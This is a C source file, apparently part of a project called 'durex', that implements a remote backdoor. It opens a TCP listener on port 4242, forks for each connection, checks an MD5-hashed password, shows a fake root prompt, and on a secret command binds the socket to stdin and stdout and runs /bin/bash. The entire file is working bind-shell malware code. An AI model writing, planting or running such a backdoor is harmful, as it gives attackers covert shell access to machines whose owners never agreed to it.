#include <durex.h>

void	connection(int sock)
{
	char	*str;
	char	*hash;

	while (1)
	{
		write(sock, "Password : ", 11);
		if ((get_next_line(sock, &str)) <= 0)
		{
			printf("Gnl error\n");
			exit(0);
		}
		hash = md5(str);
		free(str);
		if (ft_strcmp(hash, PASSWORD) == 0)
		{
			free(hash);
			break;
		}
		free(hash);
	}
	write(sock, "Success !\n", 10);
	while (1)
	{
		write(sock, "(root) # ", 9);
		if ((get_next_line(sock, &str)) <= 0)
		{
			printf("Gnl error\n");
			exit(0);
		}
		if (ft_strcmp(str, SHELL) == 0)
		{
			write(sock, "shell run\n", 10);
			break ;
		}
		free(str);
	}
	dup2(sock, 1);
	dup2(sock, 0);
	execv("/bin/bash", NULL);
}

void	handle_connection(int sock)
{
	int					cs;
	struct sockaddr_in	csin;
	socklen_t			addrlen;

	while (42)
	{
		addrlen = sizeof(struct sockaddr_in);
		if ((cs = accept(sock, (struct sockaddr*)&csin, &addrlen)) == -1)
		{
			ft_putendl_fd("Error on accept", 2);
			perror("");
			exit(2);
		}
		else
		{
			if (fork() == 0)
			{
				connection(cs);
				exit(1);
			}
			else
				close(cs);
		}
	}
}

int		create_server()
{
	int				sock;
	struct protoent	*proto;
	struct sockaddr_in	sin;

	if (!(proto = getprotobyname("tcp")))
	{
		ft_putendl_fd("Error: Could not get proto tcp.", 2);
		return (0);
	}
	sock = socket(AF_INET, SOCK_STREAM, proto->p_proto);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(2121 * 2);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		ft_putendl_fd("Error: Bind failure", 2);
		return (0);
	}
	if (listen(sock, 3) == -1)
	{
		ft_putendl_fd("Error: Listen failure", 2);
		return (0);
	}
	return (sock);
}
